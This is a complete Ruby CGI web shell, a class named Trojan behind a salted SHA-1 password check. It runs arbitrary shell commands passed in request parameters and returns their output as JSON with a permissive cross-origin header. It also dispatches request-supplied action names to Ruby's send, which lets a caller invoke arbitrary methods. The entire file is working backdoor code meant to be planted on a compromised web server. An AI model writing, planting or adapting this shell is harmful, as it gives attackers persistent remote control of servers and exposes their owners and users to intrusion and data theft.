#!/usr/bin/env ruby

require 'cgi'
require 'digest/sha1'
require 'json'

class Trojan
    attr_accessor :cgi, :cwd, :response

    def initialize params
        @cgi      = params[:cgi]
        @cwd      = (params['args[cwd]'].nil?) ? `pwd`.strip! : params['args[cwd]']
        @response = {
            'error'  => '',
            'output' => {},
        };
    end

    def process_command()
        json = @cgi.params
        if json['action'].first.eql? 'shell'
            process_shell_command(json['args[cmd]'].first)
        else
            send json['action'].first, json
        end
    end

    def process_shell_command command
        out_lines                     = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
        @response['output']['cwd']    = @cwd = out_lines.pop
        @response['output']['stdout'] = out_lines.join "\n"
        self.send_response
    end

    def send_response
        @response['output']['prompt'] = self.get_prompt_context
        puts @cgi.header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        puts
        exit
    end

    def get_prompt_context
        whoami          = `whoami`.strip!
        hostname        = `hostname`.strip!
        line_terminator = (whoami == 'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response['error'] = "#{method} unsupported"
        self.send_response
    end

    

end

# ---------- Procedural code starts here ----------
cgi  = CGI.new


hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + 'c5e5f704ee')
if hash.eql? '003da5748a1cdeac275548be9741cb35b76f773d'

    trojan = Trojan.new({ :cgi => cgi })
    trojan.process_command

else
    puts cgi.header('Access-Control-Allow-Origin: *')
    puts '{"error":"Invalid password."}'
    puts
end
